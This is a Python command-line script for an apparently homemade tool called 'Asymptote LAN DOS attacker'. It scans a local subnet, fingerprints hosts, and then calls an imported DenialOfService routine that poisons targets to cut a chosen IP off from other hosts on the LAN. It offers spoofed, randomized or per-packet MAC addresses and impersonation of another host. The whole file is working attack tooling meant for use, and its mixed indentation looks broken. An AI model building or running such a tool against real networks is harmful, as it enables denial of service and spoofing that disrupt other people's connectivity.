#!/usr/bin/env python

import click
from poison import DenialOfService
from hosts import scanTarget, getTargets, parseTargets
from sys import stderr, exit
from subnet import getSubnet, getIPMaskMAC, printInterfaces
from netaddr import IPNetwork, EUI, core
@click.command()
@click.option('-i','--iface', default='prompt',help='use this network interface')
@click.option('-s','--scan', count=True, help="find online hosts (-ss for OS and MAC identification")
@click.option('-p','--poison', default='poison', help="Quarantine specified IP for IP's within givin range")
@click.option('-v','--verbose', count=True, help="increase verbosity (-vv for greater effect)")
@click.option('-m','--MAC', default = 'MAC', help = "Source MAC address for attack\n'rand':random MAC\n'frenzy':random MAC per packet\n'local': local MAC\nIP:Disguise as host\n")
@click.argument('iprange', default='subnet')
def cli(iface, scan, poison, verbose, mac, iprange):
	"""Asymptote LAN DOS attacker

	   Examples:
	
		(Scan entire subnet of eth0 and report online hosts)
		
		asymptote -i eth0 -s 

		(Aggresively scan .102 & .104, get MAC vendor and OS fingerprint)
		
		
		asymptote -i eth1 -ss 192.168.56.102,192.168.56.104 

		(Quarantine 192.168.1.1 from all online hosts from ...12 to ...23)
		
		asymptote -i eth2 -p 192.168.1.1 192.168.1.12-192.168.1.23

	"""

	if iface == 'prompt':
		print "Available interfaces: "
		printInterfaces()
		print "\nPlease select an interface"
		exit(0)

	if scan == 0 and poison == 'poison':
		print("Please scan and/or poison the target")
		exit(0)
	

	if iprange == 'subnet':
		iprange = getSubnet(iface)
 	
	victims = getTargets(iface, iprange, scan, verbose)
			

	if poison != 'poison':
		quarantine = scanTarget(iface, poison)
		
		try: #Is every target a valid IP address?
                        ip  = IPNetwork(mac)
			mac = scanTarget(iface, mac)[1]
	        except core.AddrFormatError:
                	pass
		except IndexError:
			stderr.write("\nERROR: IP address not found on local subnet\n\n")
			exit(0)		
 		

		if mac == 'rand':
			mac = 0
		elif mac == 'frenzy':
			mac = 1
		elif mac == 'local':
			mac = getIPMaskMAC(iface)[2]
		
		else:
			try:
				test = EUI(mac)
	
			except core.AddrFormatError:
				stderr.write("\nERROR: Invalid MAC address\n\n")
				exit(0)
		try:
			DenialOfService(iface, victims, quarantine, mac, verbose)
		except IndexError:
			stderr.write("\nERROR: Target does not exist or was not found in scan\n")
			exit(0)

if __name__ == "__main__":
	cli()
